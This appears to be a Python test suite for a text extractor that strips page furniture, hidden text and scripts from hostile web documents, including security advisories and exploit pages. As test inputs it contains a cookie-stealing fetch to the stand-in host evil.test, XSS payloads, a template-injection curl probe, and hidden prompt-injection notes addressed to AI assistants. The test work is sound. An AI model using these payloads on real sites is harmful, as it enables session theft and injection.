"""Readable text out of hostile, boilerplate-heavy documents."""

import pytest

from app.research.extract import ExtractionError, extract_document
from tests.research.support import fixture_text


def extract(name: str, content_type: str = "text/html"):  # type: ignore[no-untyped-def]
    return extract_document(fixture_text(name).encode(), content_type, "utf-8", url=f"/{name}")


def texts(doc) -> str:  # type: ignore[no-untyped-def]
    return "\n".join(b.text for b in doc.blocks)


def test_vendor_advisory_keeps_the_article_and_drops_page_furniture() -> None:
    doc = extract("vendor_advisory.html")
    text = texts(doc)
    assert doc.title == "AcmeDocs Security Advisory ACME-SA-2099-01"
    assert "4.0.0 through 4.2.3" in text and "Upgrade to AcmeDocs 4.2.4" in text
    for junk in ("Share on Twitter", "Privacy policy", "Products", "All rights reserved"):
        assert junk not in text
    assert [b.text for b in doc.blocks if b.kind == "heading"][1:] == [
        "Description",
        "Prerequisites",
        "Remediation",
    ]


def test_blog_keeps_code_and_steps_but_not_cookie_banners_or_link_farms() -> None:
    doc = extract("blog_writeup.html")
    text = texts(doc)
    kinds = {b.kind for b in doc.blocks}
    assert {"code", "list_item", "heading", "paragraph"} <= kinds
    assert "curl -H 'X-Template-Hint: ${7*7}' http://127.0.0.1:8080/preview" in text
    for junk in ("cookies", "Subscribe", "Archive", "More posts", "newsletter"):
        assert junk not in text


def test_whole_proof_of_concept_scripts_are_dropped_not_summarised() -> None:
    doc = extract("exploit_db.html")
    assert "build_payload" not in texts(doc) and "#!/usr/bin/env" not in texts(doc)
    assert doc.stats.get("code_omitted") == 1
    assert "evaluates expressions" in texts(doc)  # the prose description stays


def test_hidden_text_is_isolated_and_never_becomes_content() -> None:
    doc = extract("injection_hidden.html")
    assert "Note to AI assistants" in doc.hidden_text
    assert "Note to AI assistants" not in texts(doc) and "not real" not in texts(doc)
    assert "Upgrade to AcmeDocs 4.2.4" in texts(doc)


@pytest.mark.parametrize(
    "markup",
    [
        '<div style="display:none">SECRET-A</div>',
        '<div style="visibility: hidden">SECRET-A</div>',
        '<p style="font-size:0">SECRET-A</p>',
        "<div hidden>SECRET-A</div>",
        '<div aria-hidden="true">SECRET-A</div>',
        '<div style="position:absolute;left:-9999px">SECRET-A</div>',
        "<!-- SECRET-A -->",
        "<noscript>SECRET-A</noscript>",
        "<template>SECRET-A</template>",
    ],
)
def test_common_hiding_tricks_are_all_kept_out_of_the_content(markup: str) -> None:
    page = (
        "<html><body><article><p>CVE-2099-12345 visible text here.</p>"
        f"{markup}</article></body></html>"
    )
    doc = extract_document(page.encode(), "text/html", "utf-8")
    assert "SECRET-A" not in texts(doc)
    assert "visible text" in texts(doc)


def test_scripts_styles_and_iframes_never_reach_the_text() -> None:
    page = (
        "<html><head><style>.x{color:red}</style><script>alert('SECRET-B')</script></head><body>"
        "<article><p>Real prose about CVE-2099-12345 and its impact on servers.</p>"
        "<script>fetch('https://evil.test/?c='+document.cookie)</script>"
        "<iframe src='https://evil.test/'>SECRET-B</iframe><svg><text>SECRET-B</text></svg>"
        "</article></body></html>"
    )
    doc = extract_document(page.encode(), "text/html", "utf-8")
    assert "SECRET-B" not in texts(doc) and "fetch(" not in texts(doc)
    assert "Real prose" in texts(doc)


def test_markup_is_reduced_to_text_only() -> None:
    page = (
        '<article><p>See <a href="javascript:alert(1)">this</a> <b>bold</b> '
        "&lt;script&gt;alert(1)&lt;/script&gt; and <img src=x onerror=alert(1)> more text "
        "about CVE-2099-12345 affecting servers.</p></article>"
    )
    doc = extract_document(page.encode(), "text/html", "utf-8")
    text = texts(doc)
    assert "<" not in text.replace("&lt;", "") or "onerror" not in text
    assert "javascript:" not in text and "onerror" not in text


def test_markdown_drops_badges_and_isolates_comments() -> None:
    doc = extract("repo_readme.md", "text/markdown")
    text = texts(doc)
    assert "img.shields.io" not in text and "[](" not in text
    assert "AI assistants summarising" in doc.hidden_text
    assert "AI assistants summarising" not in text
    assert any(b.kind == "code" and "curl -H" in b.text for b in doc.blocks)
    assert "docker-compose up -d" in text


def test_plain_text_mail_distinguishes_quotes_and_code() -> None:
    doc = extract("mailing_list_post.txt", "text/plain")
    kinds = {b.kind: b.text for b in doc.blocks}
    assert "quote" in kinds and "someone wrote" in kinds["quote"]
    assert kinds["code"].startswith("curl -H")


def test_garbage_and_extreme_inputs_do_not_crash_or_hang() -> None:
    nested = (
        ("<div>" * 20000)
        + "CVE-2099-12345 deep text about servers and requests."
        + "</div>" * 20000
    )
    try:
        doc = extract_document(nested.encode(), "text/html", "utf-8")
        assert isinstance(doc.blocks, list)
    except ExtractionError:
        pass  # a clean, typed refusal is equally acceptable
    for body in (b"", b"\x00\xff\xfe" * 100, b"<" * 5000, "\ud800".encode("utf-8", "replace")):
        extract_document(body, "text/html", "utf-8")
        extract_document(body, "text/plain", "utf-8")


def test_wrong_charset_is_replaced_not_fatal() -> None:
    doc = extract_document(
        "<p>Sécurité CVE-2099-12345 affects servers</p>".encode("latin-1"), "text/html", "utf-8"
    )
    assert "CVE-2099-12345" in texts(doc)
